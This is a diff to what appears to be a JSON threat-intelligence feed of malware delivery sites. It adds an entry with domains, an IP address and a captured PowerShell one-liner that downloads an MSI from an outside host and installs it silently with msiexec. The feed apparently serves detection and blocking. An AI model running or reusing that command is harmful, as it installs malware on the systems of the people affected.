@@ -836,5 +836,23 @@
       "https://github.pw/Girya/61bc1e20936221ce"
     ],
     "ReportId": "cmwe7r7jj08cs0oml2ruzlbeh"
+  },
+  {
+    "UrlDomain": "distinctiontraining.com.au",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "82.38.138.35"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwezgr170fas0omlma6arc0q"
   }
 ]
